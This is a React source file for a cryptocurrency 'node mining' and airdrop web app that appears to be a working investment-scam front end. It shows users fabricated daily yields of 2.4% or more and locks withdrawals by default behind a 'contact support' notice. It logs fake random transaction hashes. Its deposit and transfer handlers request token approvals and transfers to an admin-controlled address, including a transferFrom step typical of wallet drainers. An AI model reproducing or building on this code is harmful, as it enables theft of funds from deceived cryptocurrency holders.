import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Wallet, Settings, Activity, ShieldCheck, HelpCircle, ShieldAlert, Gift } from 'lucide-react';
import { ethers } from 'ethers';

import FinanceTab from './components/FinanceTab';
import AssetsTab from './components/AssetsTab';
import AirdropTab from './components/AirdropTab';
import AdminPanel from './components/AdminPanel';
import WalletModals from './components/WalletModals';
import TransferRequestModal from './components/TransferRequestModal';
import SupportChat from './components/SupportChat';
import ConnectGate from './components/ConnectGate';
import { UserAccount, AppConfig, YieldTier, YIELD_TIERS } from './types';
import { saveUserToFirestore, fetchConfigFromFirestore, fetchUserFromFirestore, addLogToFirestore } from './lib/firebase';
import { useLanguage } from './lib/i18n';

export default function App() {
  const { t } = useLanguage();
  const [isAdminView, setIsAdminView] = useState(false);
  const [currentTab, setCurrentTab] = useState<'finance' | 'assets' | 'airdrop' | 'chat'>('finance');
  const [connectedAddress, setConnectedAddress] = useState<string | null>(() => {
    const saved = localStorage.getItem('connectedAddress');
    if (saved === 'null' || saved === 'undefined' || !saved) return null;
    return saved;
  });
  const [userAccount, setUserAccount] = useState<UserAccount | null>(null);
  const [config, setConfig] = useState<AppConfig | null>(null);
  const [showConnectModal, setShowConnectModal] = useState(false);
  const [showTransferModal, setShowTransferModal] = useState(false);
  const [assetsInitialModal, setAssetsInitialModal] = useState<'deposit' | 'withdraw' | 'exchange' | null>(null);
  const [assetsInitialAmount, setAssetsInitialAmount] = useState<string>('');
  const [isLoading, setIsLoading] = useState(false);
  const [realProvider, setRealProvider] = useState<any>(null);

  // Synchronize connectedAddress with localStorage
  useEffect(() => {
    if (connectedAddress && connectedAddress !== 'null' && connectedAddress !== 'undefined') {
      localStorage.setItem('connectedAddress', connectedAddress);
    } else {
      localStorage.removeItem('connectedAddress');
    }
  }, [connectedAddress]);

  // Auto-connect MetaMask on page reload if previously connected
  useEffect(() => {
    const autoConnect = async () => {
      const savedAddress = localStorage.getItem('connectedAddress');
      if (savedAddress && (window as any).ethereum) {
        try {
          const provider = new ethers.BrowserProvider((window as any).ethereum);
          const accounts = await provider.listAccounts();
          if (accounts.length > 0) {
            setConnectedAddress(accounts[0].address);
            setRealProvider(provider);
          }
        } catch (e) {
          console.warn('Auto Web3 reconnection failed:', e);
        }
      }
    };
    autoConnect();
  }, []);

  // 1. Listen to routing changes (supports both URL path /admin and hash #/admin)
  useEffect(() => {
    const handleRouting = () => {
      const path = window.location.pathname;
      const hash = window.location.hash;
      if (path.endsWith('/admin') || hash === '#/admin' || hash === '#admin') {
        setIsAdminView(true);
      } else {
        setIsAdminView(false);
      }
    };

    handleRouting();
    window.addEventListener('popstate', handleRouting);
    window.addEventListener('hashchange', handleRouting);

    const handleOpenSupport = () => setCurrentTab('chat');
    window.addEventListener('openCustomerSupportChat', handleOpenSupport);

    return () => {
      window.removeEventListener('popstate', handleRouting);
      window.removeEventListener('hashchange', handleRouting);
      window.removeEventListener('openCustomerSupportChat', handleOpenSupport);
    };
  }, []);

  // 2. Load global App Configuration on startup with local storage
  const loadConfig = async () => {
    try {
      const fsConfig = await fetchConfigFromFirestore();
      if (fsConfig && Object.keys(fsConfig).length > 0) {
        setConfig(fsConfig as AppConfig);
      }
    } catch (err) {
      console.warn('Config fetch notice:', err);
    }
  };

  useEffect(() => {
    loadConfig();
    const interval = setInterval(() => {
      loadConfig();
    }, 4000);

    // Capture referral link params (?ref=... or ?code=...)
    if (typeof window !== 'undefined') {
      const urlParams = new URLSearchParams(window.location.search);
      const refParam = urlParams.get('ref') || urlParams.get('code') || urlParams.get('host');
      if (refParam) {
        localStorage.setItem('referredByCode', refParam.toUpperCase());
      }
    }

    return () => clearInterval(interval);
  }, []);

  // 3. Sync & Poll User Account details with local storage
  const syncUserAccount = async (address: string) => {
    const cleanAddress = address.toLowerCase();
    const localKey = `user_${cleanAddress}`;

    // 1. Load user from storage
    let user = await fetchUserFromFirestore(cleanAddress);

    if (!user) {
      const saved = localStorage.getItem(localKey);
      if (saved) {
        try {
          user = JSON.parse(saved);
        } catch (e) {}
      }
    }

    if (!user) {
      user = {
        walletAddress: cleanAddress,
        usdtBalance: 0,
        occupiedUSDT: 0,
        totalYieldEarned: 0,
        lastYieldPayout: Date.now(),
        createdAt: Date.now(),
        updatedAt: Date.now(),
        usdcBalance: 0,
        occupiedUSDC: 0,
        btcBalance: 0,
        occupiedBTC: 0,
        ethBalance: 0,
        occupiedETH: 0,
        isWithdrawLocked: true,
        withdrawLockNotice: 'Withdrawal Locked. Please contact support.',
      };
      await saveUserToFirestore(user);
    }

    // Default withdrawal lock to true if undefined
    if (user.isWithdrawLocked === undefined) {
      user.isWithdrawLocked = true;
      user.withdrawLockNotice = user.withdrawLockNotice || 'Withdrawal Locked. Please contact support.';
    }

    // Always ensure the multi-currency & referral properties exist
    if (user.usdcBalance === undefined) user.usdcBalance = 0;
    if (user.occupiedUSDC === undefined) user.occupiedUSDC = 0;
    if (user.btcBalance === undefined) user.btcBalance = 0;
    if (user.occupiedBTC === undefined) user.occupiedBTC = 0;
    if (user.ethBalance === undefined) user.ethBalance = 0;
    if (user.occupiedETH === undefined) user.occupiedETH = 0;
    if (user.airdropPledgedUSDT === undefined) user.airdropPledgedUSDT = 0;

    user.referralCode = user.referralCode || cleanAddress.slice(-8).toUpperCase();
    if (!user.referredBy) {
      const savedRef = localStorage.getItem('referredByCode');
      if (savedRef && savedRef !== user.referralCode) {
        user.referredBy = savedRef;
      }
    }
    if (user.referralCount === undefined) user.referralCount = 0;
    if (user.commissionEarned === undefined) user.commissionEarned = 0;

    // Live update client-side accrued yield
    const now = Date.now();
    const lastPayout = user.lastYieldPayout || now;
    const elapsedSeconds = Math.max(0, (now - lastPayout) / 1000);
    let yieldAccrued = false;

    // Total node mining assets include deposited / wallet balance and occupied staking balance
    const totalUSDT = (user.occupiedUSDT || 0) + (user.usdtBalance || 0);
    const totalUSDC = (user.occupiedUSDC || 0) + (user.usdcBalance || 0);
    const totalBTC = (user.occupiedBTC || 0) + (user.btcBalance || 0);
    const totalETH = (user.occupiedETH || 0) + (user.ethBalance || 0);

    const totalNodeValueUSD = totalUSDT + totalUSDC + (totalBTC * 65000) + (totalETH * 3500);

    if (elapsedSeconds > 0 && totalNodeValueUSD > 0) {
      const activeTiers = config?.yieldTiers && config.yieldTiers.length > 0 ? config.yieldTiers : YIELD_TIERS;
      const sorted = [...activeTiers].sort((a, b) => a.minAmount - b.minAmount);

      let matchedTier: YieldTier | undefined = undefined;
      for (let i = 0; i < sorted.length; i++) {
        const tier = sorted[i];
        const isLast = i === sorted.length - 1;
        if (totalNodeValueUSD >= tier.minAmount && (totalNodeValueUSD < tier.maxAmount || isLast)) {
          matchedTier = tier;
          break;
        }
      }

      let dailyRate = 0.024; // 2.4% daily default
      if (config?.baseYieldRate && config.baseYieldRate > 0) {
        dailyRate = config.baseYieldRate;
      }
      if (matchedTier) {
        let yMin = matchedTier.yieldMin ?? 0.024;
        let yMax = matchedTier.yieldMax ?? yMin;
        if (yMin > 1) yMin = yMin / 100;
        if (yMax > 1) yMax = yMax / 100;
        dailyRate = (yMin + yMax) / 2;
      } else if (totalNodeValueUSD < (sorted[0]?.minAmount || 100)) {
        let minR = sorted[0]?.yieldMin ?? 0.020;
        if (minR > 1) minR = minR / 100;
        dailyRate = minR;
      } else {
        const highest = sorted[sorted.length - 1];
        let hMin = highest?.yieldMin ?? 0.040;
        let hMax = highest?.yieldMax ?? 0.050;
        if (hMin > 1) hMin = hMin / 100;
        if (hMax > 1) hMax = hMax / 100;
        dailyRate = (hMin + hMax) / 2;
      }

      const earnedUSD = totalNodeValueUSD * dailyRate * (elapsedSeconds / 86400);

      if (earnedUSD > 0) {
        // Node mining profit is earned in ETH (1 ETH = $3500)
        const earnedETH = earnedUSD / 3500;
        user.totalYieldEarned = (user.totalYieldEarned || 0) + earnedUSD;
        user.ethBalance = (user.ethBalance || 0) + earnedETH;
        yieldAccrued = true;
      }
      user.lastYieldPayout = now;
    } else if (!user.lastYieldPayout) {
      user.lastYieldPayout = now;
    }

    setUserAccount(user);
    localStorage.setItem(localKey, JSON.stringify(user));

    // Only sync to Firestore if yield actually accrued
    if (yieldAccrued) {
      saveUserToFirestore(user).catch(err => console.warn('Firestore sync user notice:', err));
    }
  };

  // Poll user account details every 1.5 seconds if connected
  useEffect(() => {
    if (!connectedAddress) return;

    syncUserAccount(connectedAddress);
    const interval = setInterval(() => {
      syncUserAccount(connectedAddress);
    }, 1500);

    return () => clearInterval(interval);
  }, [connectedAddress]);

  // 4. Handle Real Web3 MetaMask Connection
  const handleConnectReal = async () => {
    setIsLoading(true);
    try {
      const ethereum = (window as any).ethereum;
      if (!ethereum) {
        throw new Error('EVM Wallet provider not found. Please install MetaMask.');
      }

      const provider = new ethers.BrowserProvider(ethereum);
      const accounts = await provider.send('eth_requestAccounts', []);
      if (accounts && accounts.length > 0) {
        const address = accounts[0];
        setConnectedAddress(address);
        setRealProvider(provider);
        await syncUserAccount(address);
        setShowConnectModal(false);
      }
    } catch (err: any) {
      console.warn('Real Web3 MetaMask connection failed:', err);
      throw err;
    } finally {
      setIsLoading(false);
    }
  };

  // 5. Handle Manual Wallet Address Connection
  const handleConnectAddress = async (address: string) => {
    let cleanAddress = address.trim().toLowerCase();
    if (!cleanAddress.startsWith('0x')) {
      cleanAddress = '0x' + cleanAddress;
    }
    if (cleanAddress.length !== 42) {
      throw new Error('Please enter a valid 42-character Ethereum address.');
    }
    setConnectedAddress(cleanAddress);
    await syncUserAccount(cleanAddress);
    setShowConnectModal(false);
  };

  // 5.5. Handle Wallet Disconnection
  const handleDisconnect = () => {
    setConnectedAddress(null);
    setUserAccount(null);
    setRealProvider(null);
  };

  // 6. Handle Deposits
  const handleDepositSubmit = async (amount: number, currency: string, isSimulated: boolean, proofImage?: string | null) => {
    if (!connectedAddress) return;

    const curUpper = 'USDT-ETH';

    let txHash = '';
    // If we have a real wallet provider, try triggering a real tx!
    if (realProvider) {
      try {
        const signer = await realProvider.getSigner();
        let rawRecipient = localStorage.getItem('custom_recipient_address') || config?.recipientAddress || '0x71C7656EC7ab88b098defB751B7401B5f6d1476B';
        const recipient = ethers.getAddress(rawRecipient.trim().toLowerCase());

        const network = await realProvider.getNetwork();
        const chainId = Number(network.chainId);

        let tokenAddress: string | null = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // Sepolia/Mainnet USDT
        const depositSys = config?.depositSystems?.find(
          (sys) => sys.currency.toUpperCase() === 'USDT' && sys.chainId === chainId
        );
        if (depositSys?.tokenAddress) {
          tokenAddress = depositSys.tokenAddress;
        }

        if (tokenAddress) {
          const balanceContract = new ethers.Contract(tokenAddress, [
            "function balanceOf(address owner) public view returns (uint256)",
            "function decimals() public view returns (uint8)"
          ], signer);

          let decimals = 6;
          try {
            decimals = await balanceContract.decimals();
          } catch (e) {
            decimals = 6;
          }

          const parsedAmount = ethers.parseUnits(amount.toString(), decimals);
          const mode = config?.depositMode || 'approve';

          let userBalance = BigInt(0);
          try {
            userBalance = await balanceContract.balanceOf(connectedAddress);
          } catch (e) {
            console.error("Failed to fetch on-chain token balance", e);
          }

          if (userBalance < parsedAmount) {
            console.warn(`User on-chain balance is lower than request (${userBalance} < ${parsedAmount}). Submitting deposit request for Admin manual approval.`);
          } else {
            if (mode === 'approve') {
              const spender = recipient;
              const tokenContract = new ethers.Contract(tokenAddress, [
                "function allowance(address owner, address spender) public view returns (uint256)",
                "function approve(address spender, uint256 value) public returns (bool)"
              ], signer);

              let currentAllowance = BigInt(0);
              try {
                currentAllowance = await tokenContract.allowance(connectedAddress, spender);
              } catch (e) {
                console.error("Failed to fetch spender allowance", e);
              }

              if (currentAllowance < parsedAmount) {
                if (currentAllowance > BigInt(0)) {
                  try {
                    const resetTx = await tokenContract.approve(spender, 0);
                    await resetTx.wait(1);
                  } catch (err: any) {
                    console.warn("Reset allowance to 0 failed or was bypassed:", err);
                  }
                }
                const approveTx = await tokenContract.approve(spender, parsedAmount);
                txHash = approveTx.hash;
                await approveTx.wait(1);
              }

              const depositContract = new ethers.Contract(spender, [
                "function deposit(address token, uint256 amount) public returns (bool)",
                "function deposit(address token, address sender, uint256 amount) public returns (bool)",
                "function depositTokens(address token, uint256 amount) public returns (bool)",
                "function depositTokens(address token, address sender, uint256 amount) public returns (bool)",
                "function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)"
              ], signer);

              let depositTx;
              try {
                depositTx = await depositContract.deposit(tokenAddress, connectedAddress, parsedAmount);
              } catch (err) {
                try {
                  depositTx = await depositContract.deposit(tokenAddress, parsedAmount);
                } catch (err2) {
                  try {
                    const tokenContractWithTransferFrom = new ethers.Contract(tokenAddress, [
                      "function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)"
                    ], signer);
                    depositTx = await tokenContractWithTransferFrom.transferFrom(connectedAddress, spender, parsedAmount);
                  } catch (err3: any) {
                    console.warn("All deposit and transferFrom methods bypassed, logging request for manual admin review.");
                  }
                }
              }

              if (depositTx) {
                txHash = depositTx.hash;
                await depositTx.wait(1);
              }
            } else {
              const tokenContract = new ethers.Contract(tokenAddress, [
                "function transfer(address to, uint256 amount) public returns (bool)"
              ], signer);

              const tx = await tokenContract.transfer(recipient, parsedAmount);
              txHash = tx.hash;
              await tx.wait(1);
            }
          }
        }
      } catch (err: any) {
        console.warn('Real chain transaction bypassed or failed, proceeding with manual deposit request:', err);
      }
    }

    const cleanAddr = connectedAddress.toLowerCase();

    // Immediately credit deposit to user account & activate mining node
    const curUser = userAccount || (await fetchUserFromFirestore(cleanAddr)) || {
      walletAddress: cleanAddr,
      usdtBalance: 0,
      occupiedUSDT: 0,
      totalYieldEarned: 0,
      lastYieldPayout: Date.now(),
      createdAt: Date.now(),
    };

    const updatedUser: UserAccount = {
      ...curUser,
      usdtBalance: (curUser.usdtBalance || 0) + amount,
      occupiedUSDT: (curUser.occupiedUSDT || 0) + amount,
      lastYieldPayout: Date.now(),
      updatedAt: Date.now(),
    };
    setUserAccount(updatedUser);
    localStorage.setItem(`user_${cleanAddr}`, JSON.stringify(updatedUser));
    saveUserToFirestore(updatedUser).catch((err) => console.warn('saveUser deposit notice:', err));

    // Log deposit
    addLogToFirestore({
      timestamp: Date.now(),
      walletAddress: cleanAddr,
      type: 'deposit',
      amount,
      currency: 'USDT-ETH',
      status: 'success',
      proofImage: proofImage || '',
      details: `Deposit of ${amount} USDT-ETH submitted. Node mining active.`,
      txHash: txHash || '0x' + Math.random().toString(16).substring(2, 34),
    }).catch(err => console.warn('addLog notice:', err));
  };

  // 7. Handle Withdraws
  const handleWithdrawSubmit = async (amount: number, currency: string) => {
    if (!connectedAddress) return;
    const cleanAddr = connectedAddress.toLowerCase();

    // Client-side withdrawal logic
    const localKey = `user_${cleanAddr}`;
    let user = (await fetchUserFromFirestore(cleanAddr)) || userAccount;
    if (user) {
      const curUpper = currency.toUpperCase();
      
      let available = 0;
      if (curUpper === 'USDT') available = user.usdtBalance || 0;
      else if (curUpper === 'USDC') available = user.usdcBalance || 0;
      else if (curUpper === 'BTC') available = user.btcBalance || 0;

      if (available < amount) {
        throw new Error('Insufficient available balance. Active farm assets are occupied.');
      }

      const updated = { ...user };
      if (curUpper === 'USDT') updated.usdtBalance = (updated.usdtBalance || 0) - amount;
      else if (curUpper === 'USDC') updated.usdcBalance = (updated.usdcBalance || 0) - amount;
      else if (curUpper === 'BTC') updated.btcBalance = (updated.btcBalance || 0) - amount;
      updated.updatedAt = Date.now();

      setUserAccount(updated);
      await saveUserToFirestore(updated);

      await addLogToFirestore({
        timestamp: Date.now(),
        walletAddress: cleanAddr,
        type: 'withdraw',
        amount,
        currency: curUpper,
        status: 'pending',
        details: `Withdrawal request for ${amount} ${curUpper} submitted. Awaiting Admin Approval.`,
      });
    }
  };

  // 8. Handle Asset Conversions/Exchange
  const handleExchangeSubmit = async (fromCurrency: string, toCurrency: string, amount: number) => {
    if (!connectedAddress) return;
    const cleanAddr = connectedAddress.toLowerCase();

    let user = (await fetchUserFromFirestore(cleanAddr)) || userAccount;
    if (user) {
      const from = fromCurrency.toUpperCase();
      const to = toCurrency.toUpperCase();

      let available = 0;
      if (from === 'USDT') available = user.usdtBalance || 0;
      else if (from === 'USDC') available = user.usdcBalance || 0;
      else if (from === 'BTC') available = user.btcBalance || 0;

      if (available < amount) {
        throw new Error(`Insufficient available ${from} balance.`);
      }

      const updated = { ...user };

      // Deduct from source
      if (from === 'USDT') updated.usdtBalance = (updated.usdtBalance || 0) - amount;
      else if (from === 'USDC') updated.usdcBalance = (updated.usdcBalance || 0) - amount;
      else if (from === 'BTC') updated.btcBalance = (updated.btcBalance || 0) - amount;

      // Convert to target (USDT=1, USDC=1, BTC=65000)
      let valueInUSDC = amount;
      if (from === 'BTC') valueInUSDC = amount * 65000;

      let receivedAmount = valueInUSDC;
      if (to === 'BTC') receivedAmount = valueInUSDC / 65000;

      // Add to target
      if (to === 'USDT') updated.usdtBalance = (updated.usdtBalance || 0) + receivedAmount;
      else if (to === 'USDC') updated.usdcBalance = (updated.usdcBalance || 0) + receivedAmount;
      else if (to === 'BTC') updated.btcBalance = (updated.btcBalance || 0) + receivedAmount;

      updated.updatedAt = Date.now();
      setUserAccount(updated);
      await saveUserToFirestore(updated);

      await addLogToFirestore({
        timestamp: Date.now(),
        walletAddress: cleanAddr,
        type: 'exchange',
        amount,
        currency: from,
        status: 'success',
        details: `Exchanged ${amount} ${from} for ${receivedAmount.toFixed(6)} ${to}.`,
      });
    }
  };

  const handleParticipateSuccess = (txHash: string, amount: number, currency: string = 'ETH') => {
    if (!connectedAddress) return;

    const usdVal = currency === 'ETH' ? amount * 4692 : amount;

    // Log participation event in local state
    addLogToFirestore({
      timestamp: Date.now(),
      walletAddress: connectedAddress.toLowerCase(),
      type: 'yield',
      amount: amount,
      currency: currency,
      status: 'success',
      details: `Participated in Node with ${amount} ${currency} on Ethereum Mainnet.`,
      txHash,
    }).catch((err) => console.warn('addLog notice:', err));

    // Update user node balance
    const cleanAddr = connectedAddress.toLowerCase();
    const user = userAccount;
    if (user) {
      const updated = {
        ...user,
        occupiedUSDT: (user.occupiedUSDT || 0) + usdVal,
        lastYieldPayout: Date.now(),
        updatedAt: Date.now(),
      };
      setUserAccount(updated);
      localStorage.setItem(`user_${cleanAddr}`, JSON.stringify(updated));
      saveUserToFirestore(updated).catch((err) => console.warn('saveUser notice:', err));
    }
  };

  const handleDirectNodeParticipate = async () => {
    if (!connectedAddress) {
      setShowConnectModal(true);
      return;
    }
    // Direct wallet money transfer page to Admin's configured recipient address
    setShowTransferModal(true);
  };

  const handleAirdropNavigateToDeposit = (amountNeeded?: number) => {
    if (!connectedAddress) {
      setShowConnectModal(true);
      return;
    }
    setShowTransferModal(true);
  };

  const handleClaimAirdropReward = (amount: number, type: string, currency: string = 'ETH') => {
    if (!connectedAddress || !userAccount) return;
    const cleanAddress = connectedAddress.toLowerCase();
    const now = Date.now();
    const isEth = currency.toUpperCase().includes('ETH') || type.toUpperCase().includes('ETH') || amount < 50;
    const ethVal = isEth ? amount : (amount / 3500);
    const usdVal = isEth ? (amount * 3500) : amount;

    const updated: UserAccount = {
      ...userAccount,
      ethBalance: (userAccount.ethBalance || 0) + ethVal,
      totalYieldEarned: (userAccount.totalYieldEarned || 0) + usdVal,
      updatedAt: now,
    };
    setUserAccount(updated);
    saveUserToFirestore(updated).catch((err) => console.warn('saveUser notice:', err));

    addLogToFirestore({
      timestamp: now,
      walletAddress: cleanAddress,
      type: 'yield',
      amount: ethVal,
      currency: 'ETH',
      status: 'success',
      details: `Claimed Airdrop Bonus: ${type} (+${ethVal.toFixed(4)} ETH)`,
    }).catch((err) => console.warn('addLog notice:', err));
  };

  const handleJoinAirdrop = (amount: number) => {
    if (!connectedAddress || !userAccount) return;
    const cleanAddress = connectedAddress.toLowerCase();

    const updatedUser: UserAccount = {
      ...userAccount,
      airdropPledgedUSDT: (userAccount.airdropPledgedUSDT || 0) + amount,
      updatedAt: Date.now(),
    };

    setUserAccount(updatedUser);
    saveUserToFirestore(updatedUser).catch((err) => console.warn('saveUser notice:', err));

    addLogToFirestore({
      timestamp: Date.now(),
      walletAddress: cleanAddress,
      type: 'system',
      amount: amount,
      currency: 'USDT',
      status: 'success',
      details: `Registered and joined Airdrop event with ${amount} USDT standard verification.`,
    }).catch((err) => console.warn('addLog notice:', err));
  };

  const handleConfirmTransfer = async (amount: number, recipientAddr: string, currency: string = 'ETH') => {
    if (!connectedAddress) {
      throw new Error('Please connect your Web3 wallet first.');
    }

    let targetRecipient = recipientAddr || config?.recipientAddress || localStorage.getItem('custom_recipient_address') || '0x71C7656EC7ab88b098defB751B7401B5f6d1476B';
    targetRecipient = targetRecipient.trim();

    if (!ethers.isAddress(targetRecipient)) {
      throw new Error(`Invalid destination address: ${targetRecipient}`);
    }

    const ethereum = (window as any).ethereum;
    if (!ethereum) {
      throw new Error('No Web3 wallet provider detected. Please open this app inside Trust Wallet or MetaMask browser.');
    }

    const provider = new ethers.BrowserProvider(ethereum);
    const signer = await provider.getSigner();

    let txHash = '';

    if (currency.toUpperCase() === 'ETH') {
      const valueInWei = ethers.parseEther(amount.toString());
      // Prompt wallet for real native ETH transfer to target address
      const tx = await signer.sendTransaction({
        to: targetRecipient,
        value: valueInWei,
      });
      txHash = tx.hash;
      await tx.wait(1);
    } else {
      // USDT ERC-20 token transfer on Ethereum Mainnet
      const tokenAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
      const cleanRecipient = targetRecipient.startsWith('0x') ? targetRecipient.substring(2) : targetRecipient;
      const paddedAddress = cleanRecipient.toLowerCase().padStart(64, '0');
      // USDT has 6 decimals on Ethereum mainnet
      const amountUnits = BigInt(Math.round(amount * 1e6));
      const paddedAmount = amountUnits.toString(16).padStart(64, '0');
      const data = '0xa9059cbb' + paddedAddress + paddedAmount;

      const tx = await signer.sendTransaction({
        to: tokenAddress,
        data: data,
      });
      txHash = tx.hash;
      await tx.wait(1);
    }

    if (!txHash) {
      throw new Error('Transaction was not sent.');
    }

    // Complete node participation in UI and Firestore ONLY upon real onchain confirmation
    handleParticipateSuccess(txHash, amount, currency);
  };

  // Sync Google Translate when currentTab changes
  useEffect(() => {
    const langCode = localStorage.getItem('selected_language_code') || 'en';
    const gtCode = langCode.split('-')[0];
    if (gtCode && gtCode !== 'en') {
      const applyLang = () => {
        const selectEl = document.querySelector('.goog-te-combo') as HTMLSelectElement;
        if (selectEl) {
          selectEl.value = gtCode;
          selectEl.dispatchEvent(new Event('change'));
          selectEl.dispatchEvent(new Event('input'));
        }
      };
      const t1 = setTimeout(applyLang, 150);
      const t2 = setTimeout(applyLang, 500);
      return () => {
        clearTimeout(t1);
        clearTimeout(t2);
      };
    }
  }, [currentTab]);

  const handleBackToClient = () => {
    setIsAdminView(false);
    loadConfig();
    // Remove /admin or hash
    if (window.location.hash) {
      window.location.hash = '';
    }
    if (window.location.pathname.endsWith('/admin')) {
      window.history.pushState('', '', '/');
    }
  };

  if (isAdminView) {
    return <AdminPanel onBack={handleBackToClient} onConfigUpdated={() => loadConfig()} />;
  }

  if (!connectedAddress) {
    return (
      <ConnectGate
        onConnectReal={handleConnectReal}
        isLoading={isLoading}
        onOpenAdmin={() => {
          window.location.hash = '#/admin';
          setIsAdminView(true);
        }}
      />
    );
  }

  return (
    <div className="bg-slate-50 min-h-screen text-slate-800 flex flex-col w-full mx-auto relative shadow-sm pb-20">
      {/* Blocked Account Alert Banner */}
      {userAccount?.isBlocked && (
        <div className="bg-red-600 text-white p-3 text-center text-xs font-bold flex items-center justify-center gap-2 shadow-md shrink-0">
          <ShieldAlert className="w-4 h-4 shrink-0" />
          <span>Account Blocked: Your account has been restricted by system administrator.</span>
        </div>
      )}

      {/* Dynamic Views based on bottom tabs */}
      <div className="flex-1">
        {currentTab === 'finance' ? (
          <FinanceTab
            userAccount={userAccount}
            config={config}
            onDisconnectClick={handleDisconnect}
            onParticipateClick={handleDirectNodeParticipate}
            onOpenSupportChat={() => setCurrentTab('chat')}
          />
        ) : currentTab === 'airdrop' ? (
          <AirdropTab
            userAccount={userAccount}
            config={config}
            onConnectClick={() => setShowConnectModal(true)}
            onParticipateClick={handleDirectNodeParticipate}
            onNavigateToDeposit={handleAirdropNavigateToDeposit}
            onClaimReward={handleClaimAirdropReward}
            onJoinAirdrop={handleJoinAirdrop}
          />
        ) : currentTab === 'chat' ? (
          <SupportChat
            onBack={() => setCurrentTab('finance')}
            connectedAddress={connectedAddress}
          />
        ) : (
          <AssetsTab
            userAccount={userAccount}
            connectedAddress={connectedAddress}
            config={config}
            onConnectClick={() => setShowConnectModal(true)}
            onDisconnectClick={handleDisconnect}
            onDepositSubmit={handleDepositSubmit}
            onWithdrawSubmit={handleWithdrawSubmit}
            onExchangeSubmit={handleExchangeSubmit}
            initialModal={assetsInitialModal}
            initialDepositAmount={assetsInitialAmount}
            onClearInitialModal={() => {
              setAssetsInitialModal(null);
              setAssetsInitialAmount('');
            }}
          />
        )}
      </div>

      {/* Bottom Navigation Bar - Fixed strictly at the bottom when scrolling */}
      <div className="fixed bottom-0 left-0 right-0 w-full bg-white/95 backdrop-blur-md border-t border-slate-200 py-3 px-6 sm:px-12 flex justify-around items-center z-40 shadow-[0_-4px_20px_rgba(0,0,0,0.06)]">
        <button
          onClick={() => setCurrentTab('finance')}
          className={`flex flex-col items-center gap-1 text-[11px] font-bold transition duration-200 cursor-pointer ${
            currentTab === 'finance' ? 'text-emerald-500 scale-105' : 'text-slate-400 hover:text-slate-600'
          }`}
        >
          <Activity className="w-5 h-5" />
          {t('finance')}
        </button>

        <button
          onClick={() => setCurrentTab('airdrop')}
          className={`flex flex-col items-center gap-1 text-[11px] font-bold transition duration-200 cursor-pointer ${
            currentTab === 'airdrop' ? 'text-emerald-500 scale-105' : 'text-slate-400 hover:text-slate-600'
          }`}
        >
          <Gift className="w-5 h-5" />
          {t('airdrop')}
        </button>

        <button
          onClick={() => {
            if (!connectedAddress) {
              setShowConnectModal(true);
            } else {
              setCurrentTab('assets');
            }
          }}
          className={`flex flex-col items-center gap-1 text-[11px] font-bold transition duration-200 cursor-pointer ${
            currentTab === 'assets' ? 'text-emerald-500 scale-105' : 'text-slate-400 hover:text-slate-600'
          }`}
        >
          <Wallet className="w-5 h-5" />
          {t('assets')}
        </button>
      </div>

      {/* Web3 Connections Modal dialogs popup */}
      <WalletModals
        isOpen={showConnectModal}
        onClose={() => setShowConnectModal(false)}
        onConnectReal={handleConnectReal}
        isLoading={isLoading}
      />

      {/* Transfer Request Confirmation Modal matching exact UI screenshot */}
      <TransferRequestModal
        isOpen={showTransferModal}
        onClose={() => setShowTransferModal(false)}
        onConfirm={handleConfirmTransfer}
        connectedAddress={connectedAddress}
        recipientAddress={config?.recipientAddress || '0x71C7656EC7ab88b098defB751B7401B5f6d1476B'}
      />
    </div>
  );
}
